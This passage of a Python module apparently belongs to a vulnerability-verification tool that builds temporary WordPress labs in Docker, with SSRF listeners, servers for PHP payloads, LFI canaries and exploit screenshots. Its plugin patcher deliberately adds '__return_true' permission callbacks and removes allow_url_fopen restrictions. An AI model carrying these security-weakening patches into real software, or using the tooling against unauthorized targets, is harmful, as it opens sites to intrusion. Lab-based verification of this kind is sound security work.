            if _attempt < 2:
                _time.sleep(3)
        else:
            raise RuntimeError(f"docker network create failed: {_net_err}")
        self._created.append(("network", self.net))
        self.sh("volume", "create", self.vol, timeout=30)
        self._created.append(("volume", self.vol))

    def start_mysql(self, root_pw: str, db_pw: str):
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net,
               "--cpus", "1.5", "--memory", "512m", "--pids-limit", "200",
               "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=wordpress",
               "-e", "MYSQL_USER=wordpress", "-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, db_pw: str, tries: int = 150, delay: float = 3.0) -> bool:
        # tries*delay ~ 7.5 min por defecto: en Mac Apple Silicon, mysql:5.7 (sin imagen arm64)
        # corre bajo emulacion (Rosetta/QEMU en Docker Desktop) y el arranque de InnoDB en la
        # PRIMERA ejecucion puede tardar varios minutos -- confirmado en vivo: 40 intentos x 2s
        # (80s) no bastaban y 'MySQL no respondio a tiempo' salia con el contenedor aun
        # inicializando, no realmente colgado.
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-uwordpress",
                       f"-p{db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def start_wordpress(self, db_pw: str) -> Optional[str]:
        """Publica el puerto 80 en un puerto ALEATORIO de todas las interfaces del host (0.0.0.0).
        No se puede restringir a 127.0.0.1: cuando binoracle corre en un contenedor (el caso real,
        via Docker-fuera-de-Docker), un bind a 127.0.0.1 solo seria alcanzable desde el PROPIO
        host, nunca desde nuestro contenedor ni desde ningun otro -- ver _lab_host(). El riesgo se
        acota con un puerto aleatorio de corta vida, torn down siempre al final, y siendo esto un
        laboratorio efimero pensado solo para objetivos/engagements autorizados."""
        # Guardadas para reusar en wp_cli(): wp-config.php (de la imagen oficial) lee estas
        # variables en TIEMPO DE EJECUCION via getenv_docker(), no las hornea en el fichero. El
        # contenedor wp-cli es OTRO contenedor (solo comparte el volumen, no el entorno del
        # contenedor de Apache), asi que sin pasarselas tambien a el, getenv_docker() cae a su
        # valor por defecto ('mysql') y wp-cli intenta conectar a un host que no existe.
        self._db_env = ["-e", f"WORDPRESS_DB_HOST={self.mysql}", "-e", "WORDPRESS_DB_NAME=wordpress",
                        "-e", "WORDPRESS_DB_USER=wordpress", "-e", f"WORDPRESS_DB_PASSWORD={db_pw}"]
        self.sh("run", "-d", "--name", self.wp, "--network", self.net, "--platform", "linux/amd64",
               "-v", f"{self.vol}:/var/www/html", *self._db_env,
               "--cpus", "2.0", "--memory", "768m", "--pids-limit", "400",
               "-p", "0.0.0.0::80", _WP_IMAGE, timeout=90)
        self._created.append(("container", self.wp))
        r = self.sh("port", self.wp, "80", timeout=15)
        m = re.search(r":(\d+)\s*$", (r.stdout or "").strip())
        return m.group(1) if m else None

    def http_ready(self, port: str, tries: int = 150, delay: float = 3.0) -> bool:
        # igual que mysql_ready (~7.5 min): confirmado en vivo que 80x3s (4 min) tampoco bastaba
        # en Apple Silicon -- Apache/PHP bajo emulacion amd64 puede tardar varios minutos en
        # responder al primer arranque, igual que le pasaba a MySQL.
        import urllib.request
        url = f"http://{_lab_host()}:{port}/wp-login.php"
        for _ in range(tries):
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    if r.status < 500:
                        return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def logs_tail(self, name: str, lines: int = 40) -> str:
        """Ultimas lineas del log de un contenedor, para diagnosticar fallos de arranque sin
        tener que reproducirlos (p.ej. por que Apache/MySQL no respondieron a tiempo)."""
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def write_canary(self, path: str, content: str, timeout: float = 15.0) -> bool:
        """Escribe un fichero DENTRO del propio contenedor de Apache (no en el volumen compartido
        /var/www/html -- esto usa `docker exec` directo), en una ruta del sistema de ficheros real
        del contenedor. Sirve como marcador para verificar path-traversal/LFI de verdad: si el
        endpoint vulnerable, al pedir una ruta ajena al directorio web, devuelve este contenido
        exacto, es prueba inequivoca de lectura de fichero real -- no una deduccion por status code."""
        r = self.sh("exec", "-i", self.wp, "sh", "-c", f"cat > {path}",
                    input_text=content, timeout=timeout)
        return r.returncode == 0

    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
        """Levanta un contenedor 'callback' en la MISMA red Docker del laboratorio (no en el
        host, no expuesto a internet) que solo escucha en TCP/8080 y vuelca cualquier conexion
        entrante a un fichero. Sirve para confirmar SSRF: si el endpoint vulnerable hace de
        verdad una peticion saliente hacia aqui (porque el SERVIDOR, no el navegador del
        atacante, sigue una URL que el atacante controla), la conexion queda grabada con el
        token unico que iba en la ruta -- prueba de la peticion saliente real, no una
        suposicion por status code."""
        self.listener = f"binoracle-wpverify-{self.tag}-ssrf"
        r = self.sh("run", "-d", "--name", self.listener, "--network", self.net, _ALPINE_IMAGE,
                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
                   timeout=timeout)
        if r.returncode != 0:
            return None
        self._created.append(("container", self.listener))
        return self.listener

    def start_http_server(self, serve_body: bytes, content_type: str = "text/plain",
                          timeout: float = 30.0) -> Optional[str]:
        """Levanta un mini servidor HTTP en la red del laboratorio que responde a cualquier
        GET con serve_body (p.ej. codigo PHP). Util para CVEs donde el plugin descarga
        una URL y guarda el contenido (arbitrary file write via URL fetch).
        Tambien vuelca la URL solicitada a /var/log/ssrf.log para verificacion SSRF."""
        self.listener = f"binoracle-wpverify-{self.tag}-ssrf"
        import base64 as _b64
        body_b64 = _b64.b64encode(serve_body).decode()
        ct_safe = content_type.replace("'", "").replace('"', "")
        # Encode the full Python server script as base64 to avoid all shell-quoting
        # and newline-in-string issues when passed through Docker → sh → python3.
        _srv_src = (
            "import base64,http.server,socketserver\n"
            f"BODY=base64.b64decode('{body_b64}')\n"
            f"CT='{ct_safe}'\n"
            "class H(http.server.BaseHTTPRequestHandler):\n"
            " def do_GET(self):\n"
            "  open('/var/log/ssrf.log','ab').write(('REQ '+self.path+'\\n').encode())\n"
            "  self.send_response(200)\n"
            "  self.send_header('Content-Type',CT)\n"
            "  self.send_header('Content-Length',str(len(BODY)))\n"
            "  self.end_headers()\n"
            "  self.wfile.write(BODY)\n"
            " def log_message(self,*a):pass\n"
            "socketserver.TCPServer.allow_reuse_address=True\n"
            "socketserver.TCPServer(('',8080),H).serve_forever()\n"
        )
        srv_b64 = _b64.b64encode(_srv_src.encode()).decode()
        cmd = f"python3 -c \"import base64;exec(base64.b64decode('{srv_b64}').decode())\""
        r = self.sh("run", "-d", "--name", self.listener, "--network", self.net, _ALPINE_IMAGE,
                    "sh", "-c", f"apk add -q python3 2>/dev/null; {cmd}",
                    timeout=timeout)
        if r.returncode != 0:
            return None
        self._created.append(("container", self.listener))
        import time as _time; _time.sleep(2)  # let python server boot
        return self.listener

    def listener_log(self, timeout: float = 10.0) -> str:
        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
        return (r.stdout or "") if r.returncode == 0 else ""

    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
        """IP interna REAL (no adivinada) del contenedor en la red del laboratorio -- se usa para
        construir variantes de SSRF que apuntan al mismo listener por IP (decimal/hex/octal) en
        vez de por nombre, que es como de verdad se saltan los filtros que solo bloquean
        'localhost'/nombres de host conocidos pero no revisan la IP numerica."""
        r = self.sh("inspect", "-f",
                   f"{{{{(index .NetworkSettings.Networks \"{self.net}\").IPAddress}}}}",
                   name, timeout=timeout)
        ip = (r.stdout or "").strip()
        return ip or None

    def find_in_webroot(self, token: str, timeout: float = 10.0,
                        base_dir: str = "wp-content/uploads") -> Optional[str]:
        """Busca, DENTRO del propio contenedor Apache, la ruta REAL de un fichero cuyo nombre
        contenga `token` bajo `base_dir` (relativo a /var/www/html; por defecto wp-content/uploads,
        el caso de file-upload directo) -- usado donde WordPress puede renombrar/sanear el nombre
        subido o colocarlo en un directorio que depende del slug, asi que la ruta publica no se
        puede adivinar por convencion, hay que preguntarle al propio filesystem. Un verificador de
        instalacion de plugin/tema (Plugin_Upgrader->install()) pasa base_dir='wp-content/plugins'
        en vez de uploads, mismo mecanismo, distinta raiz. `token` es siempre un token nuestro
        (hex, de _token()), nunca entrada de la hipotesis -- no hay inyeccion de shell posible."""
        root = f"/var/www/html/{base_dir.strip('/')}"
        r = self.sh("exec", self.wp, "sh", "-c",
                   f"find {root} -iname '*{token}*' -type f "
                   f"2>/dev/null | head -1", timeout=timeout)
        p = (r.stdout or "").strip()
        return p or None

    def wp_cli(self, *args, timeout=120.0) -> subprocess.CompletedProcess:
        r = self.sh("run", "--rm", "--network", self.net, "--platform", "linux/amd64",
                    "-v", f"{self.vol}:/var/www/html", *self._db_env, "--user", "33:33",
                    _WPCLI_IMAGE, "wp", "--path=/var/www/html", *args, timeout=timeout)
        # Docker garbage collection can delete the network between lab setup and wp-cli use.
        # Recreate it and retry once when that happens.
        if r.returncode != 0 and "network" in (r.stderr or "").lower() and "not found" in (r.stderr or "").lower():
            try:
                self.sh("network", "create", self.net, timeout=30)
            except Exception:
                pass
            r = self.sh("run", "--rm", "--network", self.net, "--platform", "linux/amd64",
                        "-v", f"{self.vol}:/var/www/html", *self._db_env, "--user", "33:33",
                        _WPCLI_IMAGE, "wp", "--path=/var/www/html", *args, timeout=timeout)
        return r

    def exec_mysql(self, query: str, db_pw: str, timeout: float = 20.0) -> str | None:
        """Ejecuta una query SQL directamente en el contenedor MySQL del lab via `docker exec`.
        Devuelve el stdout si el comando tuvo exito (puede ser "" para DML que no produce filas),
        o None si el retorno fue != 0 (error SQL, tabla inexistente, etc.).
        La distincion None vs "" es importante para _seed_plugin_tables: "" = INSERT exitoso
        sin filas de salida; None = INSERT fallido (tabla no existe, error de sintaxis, etc.)."""
        r = self.sh("exec", self.mysql,
                    "mysql", "-uwordpress", f"-p{db_pw}", "-D", "wordpress",
                    "-e", query, timeout=timeout)
        return (r.stdout or "") if r.returncode == 0 else None

    def install_plugin(self, host_plugin_dir: str, slug: str, timeout=180.0) -> bool:
        """Copia el plugin (ya descargado a `host_plugin_dir`, que contiene <slug>/...) dentro del
        volumen compartido. NO usa un bind mount de `host_plugin_dir`: ese directorio lo creo YO
        (websource.py), dentro del PROPIO contenedor de binoracle -- con Docker-fuera-de-Docker el
        `docker run` real lo ejecuta el daemon del HOST, que no tiene forma de ver una ruta que solo
        existe en nuestro filesystem (confirmado en vivo: tras arreglar la resolucion de red,
        'no se pudo copiar el plugin al laboratorio' seguia saliendo). En vez de eso, empaqueto el
        plugin en un tar EN MEMORIA (si que puedo leerlo yo, es mi propio disco) y lo paso por
        stdin a un contenedor Alpine efimero que solo necesita el volumen Docker con nombre (ese si
        es un recurso del daemon, visible sea donde sea que corra binoracle)."""
        plugin_path = os.path.join(host_plugin_dir, slug)
        buf = io.BytesIO()
        # WP core classes used in plugins with namespaces: `extends WP_List_Table` in
        # `namespace Foo` resolves to `Foo\WP_List_Table` (non-existent) in PHP 7+/8+.
        # Patch `extends WP_CoreClass` → `extends \WP_CoreClass` before tarring so the
        # lab (PHP 8.0 Docker) doesn't fatal on class load.
        _WP_GLOBAL_CLASSES = re.compile(
            r'\bextends\s+(WP_(?:List_Table|Widget|REST_Controller|REST_Posts_Controller'
            r'|REST_Terms_Controller|REST_Users_Controller|REST_Comments_Controller'
            r'|Customize_Control|Customize_Setting|Customize_Section|Customize_Panel'
            r'|Query|Error|Rewrite|Roles)|Walker(?:_Category|_Comment|_Nav_Menu|_Page)?'
            r'|WC_(?:Payment_Gateway|Shipping_Method|Product|Order))',
            re.MULTILINE)
        _HAS_NAMESPACE_RE = re.compile(r'^\s*namespace\s+\S', re.MULTILINE)


        # PHP 8: in the CALLEE, convert `public function method(...)` to
        # `public static function method(...)` when the entire method body has no
        # `$this` reference.  This correctly handles the common PHP 7 pattern of
        # calling instance methods as static (safe when method ignores $this).
        # We scan for the opening brace and walk braces to extract the full body.
        _PUB_FUNC_RE = re.compile(
            r'\bpublic\s+(function\s+(\w+)\s*\([^)]*\))\s*\{'
        )
        # Magic methods must NEVER be made static (crashes `new Foo()` and serialization).
        _PHP_MAGIC_METHODS = frozenset({
            "__construct", "__destruct", "__clone", "__wakeup", "__sleep",
            "__get", "__set", "__isset", "__unset", "__call", "__callStatic",
            "__invoke", "__toString", "__serialize", "__unserialize",
            "__debugInfo", "__set_state",
        })

        # PHP 8.0 hard-removed create_function().  Replace with an anonymous function.
        # Only handles the common single-quoted / double-quoted literal form; dynamic
        # expressions are left as-is (they're rare and hard to transform safely).
        _CREATE_FUNC_RE = re.compile(
            r'create_function\s*\(\s*([\'"])(.*?)\1\s*,\s*([\'"])(.*?)\3\s*\)',
            re.DOTALL,
        )

        # Strip ini_set('allow_url_fopen', 0) calls — plugins that disable this prevent
        # the lab verifier from using file_get_contents() to fetch the payload URL.
        _ALLOW_URL_FOPEN_DISABLE_RE = re.compile(
            r'ini_set\s*\(\s*[\'"]allow_url_fopen[\'"]\s*,\s*[\'"]?0[\'"]?\s*\)\s*;?',
        )

        # REST route: add permission_callback => '__return_true' when missing (required
        # since WP 5.5; without it WP emits _doing_it_wrong and some configs return 500)
        _MISSING_PERM_CB_RE = re.compile(
            r"(register_rest_route\s*\([^;]+?'methods'\s*=>\s*'[A-Z]+"
            r"(?:(?!'permission_callback').)+?)\)",
            re.DOTALL,
        )

        # URL-fetch-and-save pattern: `$var = file_get_contents($_POST["<key>"]);`
        # Inject a $_FILES fallback so the verifier can supply content via multipart upload
        # instead of a reachable URL — this makes URL-download file-write CVEs testable
        # in isolated lab containers that have no outbound connectivity.
        _URL_FETCH_SAVE_RE = re.compile(
            r'(\$(\w+)\s*=\s*file_get_contents\(\s*\$_POST\s*\[\s*["\'](\w+)["\']\s*\]\s*\))',
        )

        def _php_patch(src_bytes: bytes) -> bytes:
            try:
                text = src_bytes.decode("utf-8", errors="replace")
            except Exception:
                return src_bytes
            patched = text
            # 1) namespace: add backslash prefix to WP global classes
            if _HAS_NAMESPACE_RE.search(patched):
                patched = _WP_GLOBAL_CLASSES.sub(lambda m: m.group(0).replace(
                    "extends " + m.group(1), "extends \\" + m.group(1)), patched)
            # 2a) PHP 8 callee-side: make `public function` → `public static function`
            #     when the method body has no $this reference.  This handles classes with
            #     private constructors (singletons) where caller-side `new Foo()` would fail.
            #     Magic methods are excluded — making __construct static crashes new Foo().
            def _make_method_static(text: str) -> str:
                result = []
                pos = 0
                for m in _PUB_FUNC_RE.finditer(text):
                    method_name = m.group(2)
                    if method_name in _PHP_MAGIC_METHODS:
                        continue
                    brace_pos = m.end() - 1   # the '{' is at m.end()-1
                    depth = 1
                    i = brace_pos + 1
                    while i < len(text) and depth > 0:
                        if text[i] == '{':
                            depth += 1
                        elif text[i] == '}':
                            depth -= 1
                        i += 1
                    body = text[brace_pos + 1 : i - 1]
                    if '$this' not in body:
                        result.append(text[pos:m.start()])
                        result.append('public static ' + m.group(1) + ' {')
                        pos = m.end()
                if pos == 0:
                    return text
                result.append(text[pos:])
                return ''.join(result)
            patched = _make_method_static(patched)
            # 2b) PHP 8.0 hard-removed create_function() — replace with anonymous function.
            def _replace_create_function(m):
                args_str = m.group(2)
                body_str = m.group(4)
                return f'function({args_str}) {{ {body_str} }}'
            patched = _CREATE_FUNC_RE.sub(_replace_create_function, patched)
            # 2c) Remove ini_set('allow_url_fopen', 0) — plugins that disable this prevent
            #     file_get_contents() from fetching the payload URL in the isolated lab.
            patched = _ALLOW_URL_FOPEN_DISABLE_RE.sub('', patched)
            # 3) add missing permission_callback to register_rest_route arrays
            def _add_perm_cb(m):
                block = m.group(0)
                if "permission_callback" in block:
                    return block
                idx = block.rfind(")")
                if idx == -1:
                    return block
                body = block[:idx]
                body_stripped = body.rstrip()
                sep = "" if body_stripped.endswith(",") else ","
                return body_stripped + sep + "\n    'permission_callback' => '__return_true'\n)"
            patched = _MISSING_PERM_CB_RE.sub(_add_perm_cb, patched)
            # 4) URL-fetch-and-save: add $_FILES multipart fallback so the lab verifier
            #    can pass content directly without needing an outbound-reachable URL.
            def _add_files_fallback(m):
                var, url_key = m.group(2), m.group(3)
                return (
                    f'${var} = !empty($_FILES["file_name"]["tmp_name"])'
                    f' ? file_get_contents($_FILES["file_name"]["tmp_name"])'
                    f' : (!empty($_FILES["file"]["tmp_name"])'
                    f' ? file_get_contents($_FILES["file"]["tmp_name"])'
                    f' : file_get_contents($_POST["{url_key}"]))'
                )
            patched = _URL_FETCH_SAVE_RE.sub(_add_files_fallback, patched)
            # 5) Inject into the main plugin file (identified by Plugin Name: docblock):
            #    a) Cap outbound HTTP timeout to 1s — prevents call-home blocking.
            #    b) Suppress PHP deprecation/notice output — PHP 8.1+ emits deprecation
            #       warnings (implicit nullable, optional-before-required params, etc.)
            #       that prepend text to the response body and break JSON parsing.
            if ('* Plugin Name:' in patched or '* Plugin Name :' in patched):
                _php_open = patched.find('<?php')
                if _php_open != -1:
                    _nl = patched.find('\n', _php_open)
                    if _nl != -1:
                        _inject = ""
                        if ('wp_remote_' in patched
                                and "add_filter('http_request_timeout'" not in patched):
                            _inject += ("\nadd_filter('http_request_timeout',"
                                        "function(){return 1;},PHP_INT_MAX);")
                        if 'error_reporting(' not in patched[:600]:
                            _inject += ("\n@ini_set('display_errors','0');"
                                        "error_reporting(E_ERROR|E_PARSE);")
                        if _inject:
                            patched = patched[:_nl + 1] + _inject + "\n" + patched[_nl + 1:]
            # 6) Suppress notices in ALL plugin PHP files via output buffering start —
            #    catches files included mid-request where the main file's error_reporting
            #    hasn't loaded yet (e.g. autoloaded class files, included partials).
            elif ('<?php' in patched
                    and 'error_reporting(' not in patched[:200]
                    and ('Deprecated:' in patched or 'Notice:' in patched
                         or 'function (' in patched)):
                # Light-touch: only suppress if file contains notice-prone patterns
                _php_open2 = patched.find('<?php')
                if _php_open2 != -1:
                    _nl2 = patched.find('\n', _php_open2)
                    if _nl2 != -1:
                        patched = (patched[:_nl2 + 1]
                                   + "\n@ini_set('display_errors','0');\n"
                                   + patched[_nl2 + 1:])
            # 7) PHP 8.2 deprecated ${var} string interpolation → {$var}.
            #    "Hello ${name}" is a deprecation warning in 8.2 and breaks JSON in some envs.
            import re as _re
            patched = _re.sub(r'\$\{([A-Za-z_]\w*)\}', r'{$\1}', patched)
            # 8) PHP 8.2 removed utf8_encode()/utf8_decode() — replace with mb_convert_encoding.
            #    Some plugins call these on ASCII strings where the replacement is equivalent.
            if 'utf8_encode(' in patched:
                patched = patched.replace(
                    'utf8_encode(', 'mb_convert_encoding(')
                # mb_convert_encoding takes (string, to, from) — add charset args after first arg
                # Simple: replace `mb_convert_encoding(X)` → `mb_convert_encoding(X,"UTF-8","ISO-8859-1")`
                patched = _re.sub(
                    r'mb_convert_encoding\(([^,)]+)\)',
                    r'mb_convert_encoding(\1,"UTF-8","ISO-8859-1")',
                    patched)
            if 'utf8_decode(' in patched:
                patched = patched.replace('utf8_decode(', '_binoracle_utf8_decode(')
                if '_binoracle_utf8_decode' not in patched[:100]:
                    _php_open3 = patched.find('<?php')
                    if _php_open3 != -1:
                        _nl3 = patched.find('\n', _php_open3)
                        if _nl3 != -1:
                            _helper = ("\nfunction _binoracle_utf8_decode($s){"
                                       "return mb_convert_encoding($s,'ISO-8859-1','UTF-8');}\n")
                            patched = patched[:_nl3 + 1] + _helper + patched[_nl3 + 1:]
            # 9) mb_* soft-shim: if mbstring is not available in the lab container, the lab
            #    will fatally fail on mb_strlen etc. Add a compatibility shim file into the
            #    lab only when the plugin uses mb_* functions.
            #    We handle it by injecting a require_once of the shim at the top of the main
            #    plugin file — the shim is written separately by _build_mb_shim().
            if ('* Plugin Name:' in patched or '* Plugin Name :' in patched):
                _mb_calls = _re.findall(r'\bmb_(?:strlen|substr|strpos|strrpos|strtolower|'
                                        r'strtoupper|convert_encoding|detect_encoding|'
                                        r'internal_encoding|ereg|eregi)\s*\(', patched)
                if _mb_calls:
                    _php_open4 = patched.find('<?php')
                    if _php_open4 != -1:
                        _nl4 = patched.find('\n', _php_open4)
                        if _nl4 != -1 and "if(!extension_loaded('mbstring'))" not in patched[:800]:
                            _shim = ("\nif(!extension_loaded('mbstring')){function mb_strlen"
                                     "($s,$e=''){return strlen($s);}function mb_substr($s,$st,"
                                     "$l=null,$e=''){return $l===null?substr($s,$st):"
                                     "substr($s,$st,$l);}function mb_strpos($h,$n,$o=0,$e='')"
                                     "{return strpos($h,$n,$o);}function mb_strtolower($s,"
                                     "$e=''){return strtolower($s);}function mb_strtoupper($s,"
                                     "$e=''){return strtoupper($s);}}\n")
                            patched = patched[:_nl4 + 1] + _shim + patched[_nl4 + 1:]
            return patched.encode("utf-8", errors="replace") if patched != text else src_bytes

        with tarfile.open(fileobj=buf, mode="w") as tf:
            for root, dirs, files in os.walk(plugin_path):
                dirs.sort()
                for fname in sorted(files):
                    fpath = os.path.join(root, fname)
                    arcname = os.path.join(slug, os.path.relpath(fpath, plugin_path))
                    if fname.endswith(".php"):
                        try:
                            raw = open(fpath, "rb").read()
                            patched = _php_patch(raw)
                            info = tarfile.TarInfo(name=arcname)
                            info.size = len(patched)
                            tf.addfile(info, io.BytesIO(patched))
                            continue
                        except Exception:
                            pass
                    tf.add(fpath, arcname=arcname)
        try:
            r = subprocess.run(
                ["docker", "run", "-i", "--rm", "--platform", "linux/amd64",
                 "-v", f"{self.vol}:/var/www/html", _ALPINE_IMAGE, "sh", "-c",
                 "mkdir -p /var/www/html/wp-content/plugins && "
                 "tar -xf - -C /var/www/html/wp-content/plugins"],
                input=buf.getvalue(), capture_output=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return False
        return r.returncode == 0

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-fv", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "volume":
                    self.sh("volume", "rm", "-f", name, timeout=15)
            except Exception:
                pass


def _capture_exploit_shot(boot: "_LabSession", method: str, endpoint: str,
                          resp_or_body, highlight: str, caption_es: str,
                          caption_en: str) -> None:
    """Añade un screenshot HTTP del exploit confirmado a boot.shots y captura HTTP estructurada.
    `resp_or_body` puede ser un objeto requests.Response o un str (body directo).
    Se llama justo después de confirmar la explotación en CUALQUIER clase de vuln."""
    try:
        url = boot.base_url + endpoint
        if hasattr(resp_or_body, 'text'):
            status = resp_or_body.status_code
            body = (resp_or_body.text or "")[:6000]
            # Captura HTTP estructurada (Burp-style)
            req_obj = getattr(resp_or_body, 'request', None)
            req_method = (req_obj.method if req_obj else method) or method
            req_url    = (req_obj.url if req_obj else url) or url
            req_body   = ""
            req_headers: dict = {}
            if req_obj:
                raw_body = getattr(req_obj, 'body', None)
                if isinstance(raw_body, bytes):
                    req_body = raw_body.decode('utf-8', errors='replace')[:2000]
                elif isinstance(raw_body, str):
                    req_body = raw_body[:2000]
                raw_hdrs = getattr(req_obj, 'headers', {}) or {}
                req_headers = {k: v for k, v in raw_hdrs.items()
                               if k.lower() not in ('cookie', 'authorization')}
            resp_headers = {}
            raw_resp_hdrs = getattr(resp_or_body, 'headers', {}) or {}
            resp_headers = {k: v for k, v in raw_resp_hdrs.items()
                            if k.lower() not in ('set-cookie',)}
            boot.http_captures.append({
                "caption_es": caption_es,
                "caption_en": caption_en,
                "method": req_method,
                "url": req_url,
                "request_headers": req_headers,
                "request_body": req_body,
                "response_status": status,
                "response_reason": getattr(resp_or_body, 'reason', '') or '',
                "response_headers": resp_headers,
                "response_body": body,
                "highlight": highlight,
            })
        else:
            status = 200
            body = str(resp_or_body)[:6000]
        png = _screenshot_response(url, method, status, body, highlight=highlight, lang="es")
        if png:
            boot.shots.append({
                "png_b64": png,
                "caption_es": caption_es,
                "caption_en": caption_en,
                "url": url,
            })
    except Exception:
        pass


def _capture_terminal_shot(boot: "_LabSession", title: str, content: str,
                           highlight: str = "", caption_es: str = "",
                           caption_en: str = "", url: str = "") -> None:
    """Añade un screenshot estilo terminal a boot.shots.
    Útil para evidencias no-HTTP: listener logs, canary files, Docker output."""
    try:
        png = _screenshot_terminal_step(title, content, highlight=highlight, lang="es")
        if png:
            boot.shots.append({
                "png_b64": png,
                "caption_es": caption_es or title,
                "caption_en": caption_en or title,
                "url": url,
            })
    except Exception:
        pass


def _screenshot_response(url: str, method: str, status: int, body: str,
                         highlight: str = "", lang: str = "es") -> Optional[str]:
    """Captura visual de tipo 'visor HTTP' con la respuesta ya obtenida (no reintenta la peticion).
    Destaca visualmente `highlight` en la respuesta. Devuelve PNG en base64, o None."""
    try:
        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
    except Exception:
        return None
    import base64
    import html as _html
    import tempfile

    body_disp = body[:4000]
    body_escaped = _html.escape(body_disp)
    if highlight:
        hl_safe = _html.escape(highlight)
        body_escaped = body_escaped.replace(hl_safe,
            f'<mark class="hl">{hl_safe}</mark>')

    st_color = "#4caf50" if 200 <= status < 300 else "#f44336"
    lbl_text = "binoracle · evidencia HTTP" if lang == "es" else "binoracle · HTTP evidence"
    page_src = f"""<!doctype html>
<html><head><meta charset="utf-8"><style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font:13px/1.6 'Courier New',monospace;background:#1e1e1e;color:#d4d4d4;min-height:100vh}}
.bar{{background:#252526;padding:10px 16px;border-bottom:2px solid #007acc;display:flex;gap:12px;align-items:center}}
.meth{{color:#4ec9b0;font-weight:700;font-size:14px;white-space:nowrap}}
.url{{color:#9cdcfe;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}}
.st{{color:{st_color};font-weight:700;font-size:13px;white-space:nowrap}}
.lbl{{color:#888;font-size:11px;text-transform:uppercase;letter-spacing:.05em;white-space:nowrap}}
.body{{padding:14px 16px;white-space:pre-wrap;word-break:break-word;font-size:13px}}
mark.hl{{background:#f9a825;color:#000;padding:1px 3px;border-radius:2px;font-weight:700}}
</style></head><body>
<div class="bar">
  <span class="lbl">{_html.escape(lbl_text)}</span>
  <span class="meth">{_html.escape(method)}</span>
  <span class="url" title="{_html.escape(url[:300])}">{_html.escape(url[:200])}</span>
  <span class="st">HTTP {status}</span>
</div>
<div class="body">{body_escaped}</div>
</body></html>"""

    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**chromium_launch_kwargs())
            try:
                page = browser.new_context(
                    viewport={"width": 1200, "height": 800},
                    device_scale_factor=2,
                ).new_page()
                page.set_content(page_src, wait_until="domcontentloaded")
                page.screenshot(path=out_path, full_page=True)
            finally:
                browser.close()
        with open(out_path, "rb") as fh:
            return base64.b64encode(fh.read()).decode("ascii")
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _screenshot_terminal_step(title: str, content: str, highlight: str = "",
                              lang: str = "es") -> Optional[str]:
    """Genera una captura de estilo terminal (fondo negro, texto verde, monospace) mostrando
    un paso de la investigacion. Util para evidenciar pasos que no son peticiones HTTP.
    Devuelve PNG en base64, o None si Playwright no esta disponible."""
    try:
        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
    except Exception:
        return None
    import base64
    import html as _html
    import tempfile

    title_safe = _html.escape(title)
    if highlight:
        hl_safe = _html.escape(highlight)
        content_safe = _html.escape(content).replace(
            hl_safe, f'<mark class="hl">{hl_safe}</mark>')
    else:
        content_safe = _html.escape(content)

    lbl = "binoracle · evidencia" if lang == "es" else "binoracle · evidence"
    page_src = f"""<!doctype html>
<html><head><meta charset="utf-8"><style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font:13px/1.6 'Courier New',monospace;background:#0d1117;color:#c9d1d9;min-height:100vh}}
.bar{{background:#161b22;padding:8px 14px;border-bottom:2px solid #238636;display:flex;gap:10px;align-items:center}}
.lbl{{color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:.05em}}
.title{{color:#58a6ff;font-weight:700;font-size:13px;flex:1}}
.prompt{{color:#3fb950;padding:10px 14px 4px;font-weight:700}}
.content{{padding:4px 14px 14px;white-space:pre-wrap;word-break:break-word;color:#c9d1d9}}
mark.hl{{background:#bb8009;color:#fff;padding:1px 3px;border-radius:2px;font-weight:700}}
</style></head><body>
<div class="bar">
  <span class="lbl">{_html.escape(lbl)}</span>
  <span class="title">{title_safe}</span>
</div>
<div class="prompt">$ binoracle</div>
<div class="content">{content_safe}</div>
</body></html>"""

    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**chromium_launch_kwargs())
            try:
                page = browser.new_context(
                    viewport={"width": 1200, "height": 600},
                    device_scale_factor=2,
                ).new_page()
                page.set_content(page_src, wait_until="domcontentloaded")
                page.screenshot(path=out_path, full_page=True)
            finally:
                browser.close()
        with open(out_path, "rb") as fh:
            return base64.b64encode(fh.read()).decode("ascii")
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _screenshot_authenticated(base_url: str, session, path: str) -> Optional[str]:
    """Reusa las cookies de una requests.Session YA autenticada (via _wp_login) para abrir esa
    misma sesion en un Chromium headless (Playwright) y capturar una foto REAL de la pagina --
    evidencia visual, no solo un codigo HTTP. Mismo patron de degradacion honesta que
    dynamic.browser_observe(): si Playwright no esta instalado o el navegador no arranca, devuelve
    None sin romper la verificacion (la evidencia textual ya probada sigue siendo valida sin
    captura). Devuelve la imagen como PNG codificado en base64, o None."""
    try:
